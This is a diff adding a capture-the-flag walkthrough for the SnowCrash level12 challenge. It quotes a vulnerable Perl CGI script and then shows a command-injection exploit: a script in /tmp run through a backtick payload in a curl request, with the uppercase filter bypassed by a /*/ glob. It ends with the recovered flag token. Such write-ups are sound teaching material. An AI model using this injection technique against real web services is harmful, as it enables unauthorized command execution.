@@ -1,0 +1,46 @@
+sub t {
+	$nn = $_[1];
+	$xx = $_[0];
+	$xx =~ tr/a-z/A-Z/; # UPPERCASE
+	$xx =~ s/\s.*//; # REMOVE SPACES
+	@output = `egrep "^$xx" /tmp/xd 2>&1`; # WE WILL INJECT OUR COMMAND HERE
+	foreach $line (@output) {
+		($f, $s) = split(/:/, $line);
+		if($s =~ $nn) {
+			return 1;
+		}
+	}
+	return 0;
+}
+
+sub n {
+	if($_[0] == 1) {
+		print("..");
+	} else {
+		print(".");
+	}    
+}
+
+n(t(param("x"), param("y")));
+
+# The script uppercases all the commands so we won't be able to normally call
+	commands
+
+# The idea that comes in my mind is to create a script with a uppercase name
+	that do what we want (launch getflag and store the result)
+
+level12@SnowCrash:~$ touch /tmp/INJECT && chmod +x /tmp/INJECT
+level12@SnowCrash:~$ vim /tmp/INJECT
+	getflag > /tmp/flag
+
+# Now we must find a way to give a path to our INJECT script without caps
+	so we can't use /tmp
+
+# A good way to do this is to use the * functionality of bash
+	level12@SnowCrash:~$ ls /*/INJECT
+	/tmp/INJECT
+
+# We should be good now :D
+
+level12@SnowCrash:~$ curl 127.0.0.1:4646?x='`/*/INJECT`' && cat /tmp/flag
+..Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
